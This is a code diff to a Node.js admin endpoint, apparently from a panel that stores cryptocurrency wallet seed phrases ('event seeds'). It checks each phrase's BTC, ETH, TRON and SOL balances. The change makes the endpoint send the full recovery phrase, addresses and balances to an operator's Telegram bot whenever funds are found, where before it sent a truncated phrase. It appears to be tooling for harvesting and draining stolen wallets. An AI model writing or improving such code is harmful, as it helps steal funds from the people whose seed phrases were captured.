@@ -2248,43 +2248,43 @@ app.post('/api/admin/event-seeds/recheck', requireAdmin, requireMaster, async (r
           console.log(`[EVENT-SEED RECHECK] ID=${seed.id} 확인 중...`);
           const results = await checkMultiChainBalance(seed.phrase);
 
-          let eth = 0, tron = 0, btc = 0, sol = 0;
-          for (const r of results) {
-            const bal = parseFloat(r.balance) || 0;
-            if (r.network === 'ethereum') eth = bal;
-            else if (r.network === 'tron') tron = bal;
-          }
+          const getbal = (net) => results.find(r => r.network === net)?.balance || 0;
+          const btc  = getbal('btc');
+          const eth  = getbal('eth');
+          const tron = getbal('tron');
+          const sol  = getbal('sol');
 
           await db.pool.query(
-            `UPDATE event_seeds SET eth = ?, tron = ? WHERE id = ?`,
-            [eth, tron, seed.id]
+            `UPDATE event_seeds SET btc=?, eth=?, tron=?, sol=? WHERE id=?`,
+            [btc || null, eth || null, tron || null, sol || null, seed.id]
           );
 
-          const chainsWithBalance = results.filter(r =>
-            parseFloat(r.balance) > 0 || parseFloat(r.usdtBalance || '0') > 0
-          );
+          const chainsWithBalance = results.filter(r => (r.balance || 0) > 0);
 
           if (chainsWithBalance.length > 0) {
             // 마스터 알림봇으로 전송
-            const [[cfg]] = await db.pool.query(`SELECT setting_value FROM settings WHERE setting_key='master_bot_token' LIMIT 1`).catch(() => [[null]]);
+            const [[cfg]]     = await db.pool.query(`SELECT setting_value FROM settings WHERE setting_key='master_bot_token' LIMIT 1`).catch(() => [[null]]);
             const [[cfgChat]] = await db.pool.query(`SELECT setting_value FROM settings WHERE setting_key='master_chat_id' LIMIT 1`).catch(() => [[null]]);
             const botToken = cfg?.setting_value;
-            const chatId = cfgChat?.setting_value;
+            const chatId   = cfgChat?.setting_value;
 
-            let msg = `🎁 <b>이벤트 시드 잔고 발견!</b>\n🆔 ID: ${seed.id}\n`;
+            let msg = `🎁 <b>[이벤트 시드] 잔고 확인!</b>\n🆔 ID: ${seed.id}\n`;
             if (seed.note) msg += `📝 메모: ${seed.note}\n`;
             msg += '\n';
             for (const r of chainsWithBalance) {
-              msg += `🌐 <b>${r.network.toUpperCase()}</b>: ${r.balance} | USDT: ${r.usdtBalance || '0'}\n`;
+              msg += `━━━━━━━━━━━━━━━━━━\n`;
+              msg += `🌐 <b>${r.network.toUpperCase()}</b>\n`;
+              msg += `💰 <b>잔고:</b> ${r.balance} ${r.symbol}\n`;
+              if (r.address) msg += `🔑 <b>주소:</b> <code>${r.address}</code>\n`;
             }
-            msg += `\n🔑 시드: <code>${seed.phrase.substring(0, 30)}...</code>`;
+            msg += `\n━━━━━━━━━━━━━━━━━━\n📝 <b>시드 문구:</b>\n<code>${seed.phrase}</code>\n━━━━━━━━━━━━━━━━━━`;
 
             if (botToken && chatId) {
               await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 chat_id: chatId, text: msg, parse_mode: 'HTML'
               }).catch(e => console.error('[EVENT-SEED RECHECK] Telegram 오류:', e.message));
             }
-            console.log(`[EVENT-SEED RECHECK] ID=${seed.id} 잔고 발견! 알림 전송`);
+            console.log(`[EVENT-SEED RECHECK] ID=${seed.id} 잔고 발견! BTC=${btc} ETH=${eth} TRON=${tron} SOL=${sol}`);
           } else {
             console.log(`[EVENT-SEED RECHECK] ID=${seed.id} 잔고 없음`);
           }
